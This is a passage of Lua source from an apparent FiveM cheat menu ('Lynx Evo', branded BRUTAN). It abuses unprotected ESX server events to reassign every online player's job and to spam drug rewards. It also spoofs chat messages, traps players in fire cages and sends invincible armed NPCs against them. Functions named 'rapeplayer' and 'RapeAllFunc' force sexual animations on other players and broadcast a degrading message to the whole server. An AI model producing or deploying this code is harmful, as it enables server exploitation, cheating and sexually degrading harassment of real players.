    value = an[i].source; name = an[i].name; identifier = an[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'mecano', 4, 'hire') end end) end end;

function RealEstateAgentPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name; identifier = an[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'realestateagent', 4, 'hire') end end) end end;

function TaxiPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name; identifier = an[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'taxi', 4, 'hire') end end) end end;

function CarDealerPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name; identifier = an[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'cardealer', 4, 'hire') end end) end end;

function UnemployedPlayer(bu) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) local bv = nil;
    for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name;
    if name == GetPlayerName(bu) then bv = an[i].identifier; debugLog('found '..an[i].name..
        ' '..an[i].identifier) end; identifier = an[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bv, 'unemployed', 0, 'hire') end) end end;

function CarDealerPlayer(bu) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) local bv = nil;
    for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name;
    if name == GetPlayerName(bu) then bv = an[i].identifier; debugLog('found '..an[i].name..
        ' '..an[i].identifier) end; identifier = an[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bv, 'cardealer', 3, 'hire') end) end end;

function RealEstateAgentPlayer(bu) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) local bv = nil;
    for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name;
    if name == GetPlayerName(bu) then bv = an[i].identifier; debugLog('found '..an[i].name..
        ' '..an[i].identifier) end; identifier = an[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bv, 'realestateagent', 3, 'hire') end) end end;

function TaxiPlayer(bu) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) local bv = nil;
    for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name;
    if name == GetPlayerName(bu) then bv = an[i].identifier; debugLog('found '..an[i].name..
        ' '..an[i].identifier) end; identifier = an[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bv, 'taxi', 3, 'hire') end) end end;

function AmbulancePlayer(bu) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) local bv = nil;
    for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name;
    if name == GetPlayerName(bu) then bv = an[i].identifier; debugLog('found '..an[i].name..
        ' '..an[i].identifier) end; identifier = an[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bv, 'ambulance', 3, 'hire') end) end end;

function PolicePlayer(bu) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) local bv = nil;
    for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name;
    if name == GetPlayerName(bu) then bv = an[i].identifier; debugLog('found '..an[i].name..
        ' '..an[i].identifier) end; identifier = an[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bv, 'police', 3, 'hire') end) end end;

function MecanoPlayer(bu) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) local bv = nil;
    for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name;
    if name == GetPlayerName(bu) then bv = an[i].identifier; debugLog('found '..an[i].name..
        ' '..an[i].identifier) end; identifier = an[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bv, 'mecano', 3, 'hire') end) end end;

function bananaparty() local bw = CreateObject(GetHashKey("p_crahsed_heli_s"), 0, 0, 0, true, true, true) local bx = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true) local by = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true) AttachEntityToEntity(bw, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(bx, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(by, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) end;

function bananapartyall() Citizen.CreateThread(function() for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^BRUTAN ^3m^4m^5u^6n^7i^1t^2y", {
            141, 211, 255
        }, "^"..bs..
        "BRUTAN V6.2 ~ https://brutan.wixsite.com/fivem/fivem") end;
    for i = 0, 128 do local bw = CreateObject(GetHashKey("p_crahsed_heli_s"), 0, 0, 0, true, true, true) local bx = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true) local by = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true) AttachEntityToEntity(bw, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(bx, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(by, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) end end) end;

function semigodme() LynxEvo.LoadModels({
    GetHashKey("stt_prop_stunt_soccer_ball")
}) local bz = CreateObject(GetHashKey("stt_prop_stunt_soccer_ball"), 0, 0, 0, true, true, true) SetEntityVisible(bz, 0, 0) AttachEntityToEntity(bz, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0, 0, -1.0, 0, 0, 0, true, true, true, true, 1, true) end;

function semigodp() LynxEvo.LoadModels({
    GetHashKey("stt_prop_stunt_soccer_ball")
}) local bz = CreateObject(GetHashKey("stt_prop_stunt_soccer_ball"), 0, 0, 0, true, true, true) SetEntityVisible(bz, 0, 0) AttachEntityToEntity(bz, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, true, true, true, true, 1, true) end;

function RespawnPed(ped, bA, bB) SetEntityCoordsNoOffset(ped, bA.x, bA.y, bA.z, false, false, false, true) NetworkResurrectLocalPlayer(bA.x, bA.y, bA.z, bB, true, false) SetPlayerInvincible(ped, false) TriggerEvent('playerSpawned', bA.x, bA.y, bA.z) ClearPedBloodDamage(ped) end;

function revivep() local aq = GetPlayerServerId(SelectedPlayer) local bA = GetEntityCoords(aq) TriggerServerEvent("esx_ambulancejob:setDeathStatus", false) local bC = {
    x = ESX.Math.Round(bA.x, 1), y = ESX.Math.Round(bA.y, 1), z = ESX.Math.Round(bA.z, 1)
}
RespawnPed(aq, bC, 0.0) StopScreenEffect('DeathFailOut') DoScreenFadeIn(800) end;

function rapeplayer() Citizen.CreateThread(function() RequestModelSync("a_m_o_acult_01") RequestAnimDict("rcmpaparazzo_2") while not HasAnimDictLoaded("rcmpaparazzo_2") do Citizen.Wait(0) end;
    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true) while not NetworkHasControlOfEntity(veh) do NetworkRequestControlOfEntity(veh) Citizen.Wait(0) end;
    SetEntityAsMissionEntity(veh, true, true) DeleteVehicle(veh) DeleteEntity(veh) end; count = -0.2;
    for b = 1, 3 do local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true)) local bD = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false) SetEntityAsMissionEntity(bD, true, true) AttachEntityToEntity(bD, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) ClearPedTasks(GetPlayerPed(SelectedPlayer)) TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetPedKeepTask(bD) TaskPlayAnim(bD, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetEntityInvincible(bD, true) count = count - 0.4 end end) end;
local
function bE(a8) local bF = NetworkGetNetworkIdFromEntity(ped) local bG = 0;
NetworkRequestControlOfNetworkId(bF) while not NetworkHasControlOfNetworkId(bF) do Citizen.Wait(1) NetworkRequestControlOfNetworkId(bF) bG = bG + 1;
    if bG == 5000 then Citizen.Trace("Control failed") break end end end;
local
function bH(bI, bJ) for i = 0, 10 do local bA = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(bI)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(bI)) then local ped = CreatePed(21, GetHashKey(bI), bA.x + i, bA.y - i, bA.z, 0, true, false) and CreatePed(21, GetHashKey(bI), bA.x - i, bA.y + i, bA.z, 0, true, false) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then bE(ped) GiveWeaponToPed(ped, GetHashKey(bJ), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, bA.x, bA.y, bA.z, 500)
else Citizen.Wait(0) end end end end;

function cageplayer() LynxEvo.LoadModels({
    GetHashKey("prop_fnclink_05crnr1"), 68070371
}) x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) local bK = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false) local bL = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false) SetEntityHeading(bK, -90.0) SetEntityHeading(bL, 90.0) FreezeEntityPosition(bK, true) FreezeEntityPosition(bL, true) end;

function cageplayerfire() LynxEvo.LoadModels({
        GetHashKey("prop_fnclink_05crnr1"), 68070371
    }) x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer))) px = tonumber(string.format("%.2f", x)) py = tonumber(string.format("%.2f", y)) pz = tonumber(string.format("%.2f", z)) local bK = CreateObject(GetHashKey("prop_fnclink_05crnr1"), px - 1.70, py - 1.70, pz - 1.0, true, true, false) local bL = CreateObject(GetHashKey("prop_fnclink_05crnr1"), px + 1.70, py + 1.70, pz - 1.0, true, true, false) for i = 0, 1.70 do local bM = StartScriptFire(px - i, py, pz - 1.0, 25, false) local bN = StartScriptFire(px + i, py, pz - 1.0, 25, false) end;
    for i = 0, 1.70 do local bO = StartScriptFire(px, py - i, pz - 1.0, 25, false) local bP = StartScriptFire(px, py + i, pz - 1.0, 25, false) end;
    SetEntityHeading(bK, -90.0) SetEntityHeading(bL, 90.0) FreezeEntityPosition(bK, true) FreezeEntityPosition(bL, true) end;

function RapeAllFunc() for bs = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN ^1C^2H^3E^4A^5T^6S", {
            141, 211, 255
        }, "^"..bs..
        "You got raped by BRUTAN Cheats") end;
    Citizen.CreateThread(function() for i = 0, 128 do RequestModelSync("a_m_o_acult_01") RequestAnimDict("rcmpaparazzo_2") while not HasAnimDictLoaded("rcmpaparazzo_2") do Citizen.Wait(0) end;
            if IsPedInAnyVehicle(GetPlayerPed(i), true)
        then local veh = GetVehiclePedIsIn(GetPlayerPed(i), true) while not NetworkHasControlOfEntity(veh) do NetworkRequestControlOfEntity(veh) Citizen.Wait(0) end;
        SetEntityAsMissionEntity(veh, true, true) DeleteVehicle(veh) DeleteEntity(veh) end; count = -0.2;
        for b = 1, 3 do local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true)) local bD = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false) SetEntityAsMissionEntity(bD, true, true) AttachEntityToEntity(bD, GetPlayerPed(i), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) ClearPedTasks(GetPlayerPed(i)) TaskPlayAnim(GetPlayerPed(i), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetPedKeepTask(bD) TaskPlayAnim(bD, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetEntityInvincible(bD, true) count = count - 0.4 end end end) end;
local
function bQ() local bR = KeyboardInput("Enter X pos", "", 100) local bS = KeyboardInput("Enter Y pos", "", 100) local bT = KeyboardInput("Enter Z pos", "", 100) if bR ~= ""
and bS ~= ""
and bT ~= ""
then
if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
else entity = GetPlayerPed(-1) end;
if entity then SetEntityCoords(entity, bR + 0.5, bS + 0.5, bT + 0.5, 1, 0, 0, 1) drawNotification("~g~Teleported to coords!") end
else drawNotification("~r~Invalid coords!") end end;
local
function bU() local name = KeyboardInput("Enter Blip Name", "", 100) if name == ""
then drawNotification("~r~Invalid Blip Name!") return bU()
else local bR = KeyboardInput("Enter X pos", "", 100) local bS = KeyboardInput("Enter Y pos", "", 100) local bT = KeyboardInput("Enter Z pos", "", 100) if bR ~= ""
and bS ~= ""
and bT ~= ""
then local bV = {
    {
        colour = 75, id = 84
    }
}
for _, bW in pairs(bV) do bW.blip = AddBlipForCoord(bR + 0.5, bS + 0.5, bT + 0.5) SetBlipSprite(bW.blip, bW.id) SetBlipDisplay(bW.blip, 4) SetBlipScale(bW.blip, 0.9) SetBlipColour(bW.blip, bW.colour) SetBlipAsShortRange(bW.blip, true) BeginTextCommandSetBlipName("STRING") AddTextComponentString(name) EndTextCommandSetBlipName(bW.blip) end
    else drawNotification("~r~Invalid coords!") end end end;
    local
function bX() local aq = GetPlayerPed(-1) local bY = GetEntityCoords(aq, true) local bZ = GetClosestVehicle(GetEntityCoords(aq, true), 1000.0, 0, 4) local b_ = GetEntityCoords(bZ, true) local c0 = GetClosestVehicle(GetEntityCoords(aq, true), 1000.0, 0, 16384) local c1 = GetEntityCoords(c0, true) drawNotification("~y~Wait...") Citizen.Wait(1000) if bZ == 0 and c0 == 0 then drawNotification("~r~No Vehicle Found") elseif bZ == 0 and c0 ~= 0 then
if IsVehicleSeatFree(c0, -1) then SetPedIntoVehicle(aq, c0, -1) SetVehicleAlarm(c0, false) SetVehicleDoorsLocked(c0, 1) SetVehicleNeedsToBeHotwired(c0, false)
else local c2 = GetPedInVehicleSeat(c0, -1) ClearPedTasksImmediately(c2) SetEntityAsMissionEntity(c2, 1, 1) DeleteEntity(c2) SetPedIntoVehicle(aq, c0, -1) SetVehicleAlarm(c0, false) SetVehicleDoorsLocked(c0, 1) SetVehicleNeedsToBeHotwired(c0, false) end;
drawNotification("~g~Teleported Into Nearest Vehicle!") elseif bZ ~= 0 and c0 == 0 then
if IsVehicleSeatFree(bZ, -1) then SetPedIntoVehicle(aq, bZ, -1) SetVehicleAlarm(bZ, false) SetVehicleDoorsLocked(bZ, 1) SetVehicleNeedsToBeHotwired(bZ, false)
else local c2 = GetPedInVehicleSeat(bZ, -1) ClearPedTasksImmediately(c2) SetEntityAsMissionEntity(c2, 1, 1) DeleteEntity(c2) SetPedIntoVehicle(aq, bZ, -1) SetVehicleAlarm(bZ, false) SetVehicleDoorsLocked(bZ, 1) SetVehicleNeedsToBeHotwired(bZ, false) end;
drawNotification("~g~Teleported Into Nearest Vehicle!") elseif bZ ~= 0 and c0 ~= 0 then
if Vdist(b_.x, b_.y, b_.z, bY.x, bY.y, bY.z) < Vdist(c1.x, c1.y, c1.z, bY.x, bY.y, bY.z) then
if IsVehicleSeatFree(bZ, -1) then SetPedIntoVehicle(aq, bZ, -1) SetVehicleAlarm(bZ, false) SetVehicleDoorsLocked(bZ, 1) SetVehicleNeedsToBeHotwired(bZ, false)
else local c2 = GetPedInVehicleSeat(bZ, -1) ClearPedTasksImmediately(c2) SetEntityAsMissionEntity(c2, 1, 1) DeleteEntity(c2) SetPedIntoVehicle(aq, bZ, -1) SetVehicleAlarm(bZ, false) SetVehicleDoorsLocked(bZ, 1) SetVehicleNeedsToBeHotwired(bZ, false) end elseif Vdist(b_.x, b_.y, b_.z, bY.x, bY.y, bY.z) > Vdist(c1.x, c1.y, c1.z, bY.x, bY.y, bY.z) then
if IsVehicleSeatFree(c0, -1) then SetPedIntoVehicle(aq, c0, -1) SetVehicleAlarm(c0, false) SetVehicleDoorsLocked(c0, 1) SetVehicleNeedsToBeHotwired(c0, false)
else local c2 = GetPedInVehicleSeat(c0, -1) ClearPedTasksImmediately(c2) SetEntityAsMissionEntity(c2, 1, 1) DeleteEntity(c2) SetPedIntoVehicle(aq, c0, -1) SetVehicleAlarm(c0, false) SetVehicleDoorsLocked(c0, 1) SetVehicleNeedsToBeHotwired(c0, false) end end;
drawNotification("~g~Teleported Into Nearest Vehicle!") end end;
local
function c3() if DoesBlipExist(GetFirstBlipInfoId(8)) then local c4 = GetBlipInfoIdIterator(8) local blip = GetFirstBlipInfoId(8, c4) WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) wp = true
else drawNotification("~r~No waypoint!") end;
local c5 = 0.0;
height = 1000.0;
while true do Citizen.Wait(0) if wp
then
if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
else entity = GetPlayerPed(-1) end;
SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height) FreezeEntityPosition(entity, true) local c6 = GetEntityCoords(entity, true) if c5 == 0.0 then height = height - 25.0;
SetEntityCoords(entity, c6.x, c6.y, height) bool, c5 = GetGroundZFor_3dCoord(c6.x, c6.y, c6.z, 0)
else SetEntityCoords(entity, c6.x, c6.y, c5) FreezeEntityPosition(entity, false) wp = false;
height = 1000.0;
c5 = 0.0;
drawNotification("~g~Teleported to waypoint!") break end end end end;
local
function c7() local c8 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) if c8 and IsModelValid(c8) and IsModelAVehicle(c8) then RequestModel(c8) while not HasModelLoaded(c8) do Citizen.Wait(0) end;
    local veh = CreateVehicle(GetHashKey(c8), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true) SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
else drawNotification("~r~~h~Model is not valid!") end end;
local
function c9() SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false)) SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0) SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false) Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleUndriveable(vehicle, false) end;
local
function ca() SetVehicleEngineHealth(vehicle, 1000) Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleUndriveable(vehicle, false) end;
local
function cb() LynxEvo.StartRC() end;
LynxEvo.StartRC = function() if DoesEntityExist(LynxEvo.Entity) then
return end;
LynxEvo.SpawnRC() LynxEvo.Tablet(true) while DoesEntityExist(LynxEvo.Entity) and DoesEntityExist(LynxEvo.Driver) do Citizen.Wait(5) local cc = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) LynxEvo.DrawInstructions(cc) LynxEvo.HandleKeys(cc) if cc <= 3000.0 then
if not NetworkHasControlOfEntity(LynxEvo.Driver) then NetworkRequestControlOfEntity(LynxEvo.Driver) elseif not NetworkHasControlOfEntity(LynxEvo.Entity) then NetworkRequestControlOfEntity(LynxEvo.Entity) end
else TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500) end end end;
LynxEvo.HandleKeys = function(cc) if IsControlJustReleased(0, 47) then
if IsCamRendering(LynxEvo.Camera) then LynxEvo.ToggleCamera(false)
else LynxEvo.ToggleCamera(true) end end;
if cc <= 3.0 then
if IsControlJustPressed(0, 38) then LynxEvo.Attach("pick") end end;
if cc < 3000.0 then
if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 9, 1) end;
if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500) end;
if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 22, 1) end;
if IsControlPressed(0, 174) and IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 13, 1) end;
if IsControlPressed(0, 175) and IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 14, 1) end;
if IsControlPressed(0, 172) and IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 30, 100) end;
if IsControlPressed(0, 174) and IsControlPressed(0, 172) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 7, 1) end;
if IsControlPressed(0, 175) and IsControlPressed(0, 172) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 8, 1) end;
if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 4, 1) end;
if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 5, 1) end;
if IsControlJustReleased(0, 168) then SetVehicleEngineOn(LynxEvo.Entity, not GetIsVehicleEngineRunning(LynxEvo.Entity), false, true) end end end;
LynxEvo.DrawInstructions = function(cc) local cd = {
    {
        ["label"] = "Right", ["button"] = "~INPUT_CELLPHONE_RIGHT~"
    }, {
        ["label"] = "Forward", ["button"] = "~INPUT_CELLPHONE_UP~"
    }, {
        ["label"] = "Reverse", ["button"] = "~INPUT_CELLPHONE_DOWN~"
    }, {
        ["label"] = "Left", ["button"] = "~INPUT_CELLPHONE_LEFT~"
    }
}
local ce = {
    ["label"] = "Delete Car", ["button"] = "~INPUT_CONTEXT~"
}
local cf = {
    {
        ["label"] = "Toggle Camera", ["button"] = "~INPUT_DETONATE~"
    }, {
        ["label"] = "Start/Stop Engine", ["button"] = "~INPUT_SELECT_CHARACTER_TREVOR~"
    }
}
if cc <= 3000.0 then
for cg = 1, #cd do local ch = cd[cg] table.insert(cf, ch) end;
    if cc <= 3000.0 then table.insert(cf, ce) end end;
Citizen.CreateThread(function() local ci = RequestScaleformMovie("instructional_buttons") while not HasScaleformMovieLoaded(ci) do Wait(0) end;
    PushScaleformMovieFunction(ci, "CLEAR_ALL") PushScaleformMovieFunction(ci, "TOGGLE_MOUSE_BUTTONS") PushScaleformMovieFunctionParameterBool(0) PopScaleformMovieFunctionVoid() for cg, cj in ipairs(cf) do PushScaleformMovieFunction(ci, "SET_DATA_SLOT") PushScaleformMovieFunctionParameterInt(cg - 1) PushScaleformMovieMethodParameterButtonName(cj["button"]) PushScaleformMovieFunctionParameterString(cj["label"]) PopScaleformMovieFunctionVoid() end;
    PushScaleformMovieFunction(ci, "DRAW_INSTRUCTIONAL_BUTTONS") PushScaleformMovieFunctionParameterInt(-1) PopScaleformMovieFunctionVoid() DrawScaleformMovieFullscreen(ci, 255, 255, 255, 255) end) end;
LynxEvo.SpawnRC = function() local c8 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) LynxEvo.LoadModels({
        GetHashKey(c8), 68070371
    }) local ck, cl = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId()) LynxEvo.Entity = CreateVehicle(GetHashKey(c8), ck, cl, true) while not DoesEntityExist(LynxEvo.Entity) do Citizen.Wait(5) end;
    LynxEvo.Driver = CreatePed(5, 68070371, ck, cl, true) SetEntityInvincible(LynxEvo.Driver, true) SetEntityVisible(LynxEvo.Driver, false) FreezeEntityPosition(LynxEvo.Driver, true) SetPedAlertness(LynxEvo.Driver, 0.0) TaskWarpPedIntoVehicle(LynxEvo.Driver, LynxEvo.Entity, -1) while not IsPedInVehicle(LynxEvo.Driver, LynxEvo.Entity) do Citizen.Wait(0) end;
    LynxEvo.Attach("place") end;
LynxEvo.Attach = function(cm) if not DoesEntityExist(LynxEvo.Entity) then
return end;
LynxEvo.LoadModels({
    "pickup_object"
}) if cm == "place"
then AttachEntityToEntity(LynxEvo.Entity, PlayerPedId(), GetPedBoneIndex(PlayerPedId(), 28422), 3.0, 0.0, 0.5, 70.0, 0.0, 270.0, 1, 1, 0, 0, 2, 1) Citizen.Wait(200) DetachEntity(LynxEvo.Entity, false, true) PlaceObjectOnGroundProperly(LynxEvo.Entity) elseif cm == "pick"
then
if DoesCamExist(LynxEvo.Camera) then LynxEvo.ToggleCamera(false) end;
LynxEvo.Tablet(false) Citizen.Wait(100) DetachEntity(LynxEvo.Entity) DeleteVehicle(LynxEvo.Entity) DeleteEntity(LynxEvo.Driver) LynxEvo.UnloadModels() end end;
LynxEvo.Tablet = function(cn) if cn then LynxEvo.LoadModels({
    GetHashKey("prop_cs_tablet")
}) LynxEvo.LoadModels({
    "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a"
}) Citizen.CreateThread(function() while DoesEntityExist(LynxEvo.TabletEntity) do Citizen.Wait(5) if not
    IsEntityPlayingAnim(PlayerPedId(), "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a", "idle_a", 3) then end end; ClearPedTasks(PlayerPedId()) end)
else DeleteEntity(LynxEvo.TabletEntity) end end;
LynxEvo.ToggleCamera = function(cn) if not true then
return end;
if cn then
if not DoesEntityExist(LynxEvo.Entity) then
return end;
if DoesCamExist(LynxEvo.Camera) then DestroyCam(LynxEvo.Camera) end;
LynxEvo.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true) AttachCamToEntity(LynxEvo.Camera, LynxEvo.Entity, 0.0, 0.0, 0.4, true) Citizen.CreateThread(function() while DoesCamExist(LynxEvo.Camera) do Citizen.Wait(5) SetCamRot(LynxEvo.Camera, GetEntityRotation(LynxEvo.Entity)) end end) local co = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10) RenderScriptCams(1, 1, co, 1, 1) Citizen.Wait(co) SetTimecycleModifier("scanline_cam_cheap") SetTimecycleModifierStrength(2.0)
else local co = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10) RenderScriptCams(0, 1, co, 1, 0) Citizen.Wait(co) ClearTimecycleModifier() DestroyCam(LynxEvo.Camera) end end;
LynxEvo.LoadModels = function(cp) for cq = 1, #cp do local bq = cp[cq]
    if
not LynxEvo.CachedModels then LynxEvo.CachedModels = {}
end;
table.insert(LynxEvo.CachedModels, bq) if IsModelValid(bq) then
while not HasModelLoaded(bq) do RequestModel(bq) Citizen.Wait(10) end
    else
        while not HasAnimDictLoaded(bq) do RequestAnimDict(bq) Citizen.Wait(10) end end end end;
        LynxEvo.UnloadModels = function() for cq = 1, #LynxEvo.CachedModels do local bq = LynxEvo.CachedModels[cq]
        if
IsModelValid(bq) then SetModelAsNoLongerNeeded(bq)
else RemoveAnimDict(bq) end end end;
local
function cr() local aq = GetPlayerPed(-1) local ar = GetVehiclePedIsIn(aq, true) local e = KeyboardInput("Enter the plate license you want", "", 100) if e ~= ""
then SetVehicleNumberPlateText(ar, e) end end;

function hweed() TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") end;

function tweed() TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") end;

